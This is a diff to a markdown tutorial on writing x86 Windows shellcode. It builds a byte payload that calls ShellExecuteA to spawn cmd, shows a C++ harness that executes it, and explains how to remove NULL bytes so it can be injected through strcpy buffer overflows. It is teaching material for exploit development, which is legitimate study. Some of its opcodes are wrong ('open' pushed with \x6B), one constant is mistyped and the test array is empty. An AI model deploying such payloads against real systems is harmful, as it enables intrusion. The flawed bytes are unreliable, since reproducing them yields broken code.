@@ -344,11 +344,197 @@ Things to remember when pushing the strings into the stack:
 "\x68\x63\x61\x6c\x63"    // PUSH "calc"
 ```
 
+6. Save the String Pointer to Registers
+```
+"\x68\x20\x20\x20\x00"    // The \x00 is the terminator, while \x20 is SPACE
+"\x68\x2e\x65\x78\x65"    // PUSH ".exe"
+"\x68\x63\x61\x6c\x63"    // PUSH "calc"
+"\x8B\xDC"                // MOV EBX, ESP
+```
+
+
 **Tips:**
 - [Opcode reference](https://defuse.ca/online-x86-assembler.htm#disassembly) or Metasm
 - Pushing byte opcode : `\x6A`
 - Pushing word or dword opcode : `\x68`
 - [List of opcodes for other types](https://c9x.me/x86/html/file_module_x86_id_269.html)
+
+###### 6.1.2 Example
+**Example:**
+1. We want to run : `ShellExecute(0,"open,"cmd", NULL,0,SW_MAXIMIZE);`
+- Pushing strings into registers
+```
+"\x68\x63\x6d\x64"       => PUSH "cmd"
+"\x68\x6f\x70\x65\x6e"   => PUSH "open"
+```
+
+```
+"\x68\x63\x6d\x64\x00"   => PUSH "cmd"
+"\x6A\x00"               => Terminates "open"
+"\x68\x6f\x70\x65\x6e"   => PUSH "open"
+```
+
+Since the *ShellExecuteA* function arguments require a pointer to these strings (and not the string itself), we will have tot save a pointer to each string using a register.
+
+Therefore, after pushing the strings to the stack, we will save the current stack position into a register (such as **EBX** or **ECX**). Hence, it will point to the string itself
+
+```
+"\x68\x63\x6d\x64\x00"   // PUSH "cmd"
+"\x8B\xDC"               // MOV EBX, ESP
+"\x6A\x00"               // Terminates "open"
+"\x68\x6f\x70\x65\x6e"   // PUSH "open"
+"\x8B\xCC"               // MOV ECX, ESP
+```
+
+- Pushing The Parameters
+Other than string we still need to pass four other parameters to the function: three of them are 0 while one is 3.
+
+We have to push them in reverse order, in order to make the right stack. We will have to push 3 first, two zeros, our strings (*cmd* and *open*), and at the end, another zero.
+
+We have many different ways t o push the integer value 3 to the stack. We can directly execute a **PUSH 3** instruction, but we can also move the value into a register and then push the register itself.
+
+We could also zero out a register and then the register 3 times, before pushing it to the stack. In our case, we will simply **PUSH** it to stack with the following instruction:
+```
+"\x6A\x03"            // PUSH 3
+```
+
+Now we have to push two zeros into the stack. To do this, we will zero out the **EAX** register, and then we will push it two times. The code will be the following:
+```
+"\x33\xC0"      // xor eax, eax
+"\x50"          // PUSH EAX => pushes 0
+"\x50"          // PUSH EAX => pushes 0
+```
+
+Now its time to push the strings.
+```
+"\x53"          // PUSH EBX
+"\x51"          // PUSH ECX
+```
+
+Then we push the first parameter : 0
+```
+"\x50"          // PUSH EAX => pushes 0
+```
+
+All the parameters have been pushed in the correct order. We need to find and push the address of the *ShellExecuteA* function and then call it.
+
+In order to find the address, you can use *arwin*
+```
+C:\>arwin.exe Shell32.dll ShellExecuteA
+
+ShellexecuteeA is located at 0x762bd970 in Shell32.dll
+```
+
+We need to move this address to a register and then call it
+```
+"\xB8\x70\xD9\x2B\x76" // MOV EAX,762bd970
+"\xFF\xD0"            // CALL EAX
+```
+
+- Putting it all together
+`ShellExecute(0,"open,"cmd", NULL,0,SW_MAXIMIZE);`
+
+```
+"\x68\x63\x6d\x64\x00"   // PUSH "cmd"
+"\x8B\xDC"               // MOV EBX, ESP
+"\x6A\x00"               // Terminates "open"
+"\x68\x6f\x70\x65\x6e"   // PUSH "open"
+"\x8B\xCC"               // MOV ECX, ESP
+
+"\x6A\x03"               // PUSH 3
+"\x33\xC0"               // xor eax, eax
+"\x50"                   // PUSH EAX => pushes 0
+"\x50"                   // PUSH EAX => pushes 0
+"\x53"                   // PUSH EBX
+"\x51"                   // PUSH ECX
+"\x50"                   // PUSH EAX => pushes 0
+
+"\xB8\x70\xD9\x2B\x76" // MOV EAX,762bd970
+"\xFF\xD0"            // CALL EAX
+```
+
+- Testing
+We can test our shellcode by using the small C++ code provided before.
+```
+#include <windows.h>
+char code[] =
+
+;
+
+int main(int argc, char **argv)
+{
+  LoadLibraryA("Shell32.dll");
+  int (*func)();
+  func = (int (*)()) code;
+  (int)(*func)();
+}
+
+```
+
+Notice that since the compiler does not automatically load the *Shell32.dll* library in the program, we have to force the program to load it with the instruction *LoadLibraryA("Shell32.dll")*
+
+
+###### 6.2 NULL-free shellcode
+
+In the previous chapter, we created a shellcode that spawned a command prompt, but as you already know this isn't a NULL-free shellcode.
+
+Therefore, if we try to use it against BOF vulnerability that uses a string function (such as *strcpy*), it will fail. This happens because when *strcpy* encounters the \\x00 byte, it stops copying data to the stack.
+
+Therefore, we have to find a way to make our shellcode NULL-free.
+
+There are 2 main techniques that we can use:
+- We can manually edit the shellcode
+- We can encode and decode the shellcode
+
+###### 6.2.1 Manual Editing
+Let's see how we can edit our shellcode in order to avoid the first string terminator (\\x68\\x63\\x6d\\x64**\\x00**)
+
+**Solution**<br>
+Substract (or add) a specific value in order to remove *00*.
+
+**Example**<br>
+For example let's say we substract *11111111* from *00646d63*. We will obtain *EF5335C52*, which does not contain the string terminator.
+
+Notice that instead of *11111111* we can use any value that does not contain *00* and that does not give a resulting value containing *00*
+
+**Steps**
+1. Move *EF535C52* into a register
+2. Adds back *11111111* to the register (in order to obtain *00646d63*)
+3. Push the value of the register on the stack
+
+**Result**<br>
+In the previous version of the shellcode, we had the following bytecode:
+```
+"\x68\x63\x6d\x64\x00"     // PUSH "cmd"
+"\x8B\xDC"                 // MOV EBX, ESP
+
+"\x6A\x00"                 // PUSH the string terminator
+                           // for 'open'
+"\x6B\x6F\x70\x65\x6E"     // PUSH "open"
+"\x8B\xCC"                 // MOV ECX, ESP: puts pointer
+                           // to open
+```
+The new bytecode (NULL-free) will be something like the following:
+```
+"\x33\xDB"                 // XOR EBX,EBX: zero out EBX
+"\xBB\x52\x5C\x53\xEF"     // MOX EBX, EF535C52
+"\x81\xC3\x11\x11\x11\x11" // ADD EBX, 11111111
+                           // (now EBX contains 00646d63)
+"\x53"                     // PUSH EBX
+"\x8B\xDC"                 // MOV EBX, ESP : puts pointer
+                           // to the string
+
+"\x33\xC0"                 // XOR EAX, EAX: zero out EAX
+"\x50"                     // PUSH EAX : push the
+                           // string terminator
+"\x6B\x6F\x70\x65\x6E"     // PUSH "open"
+"\x8B\xCC"                 // MOV ECX, ESP: puts pointer
+                           // to open
+
+```
+
+###### 6.2.2 Encoder Tools
+
 
 __________________________
 ## 7. Shellcode and Payload Generators
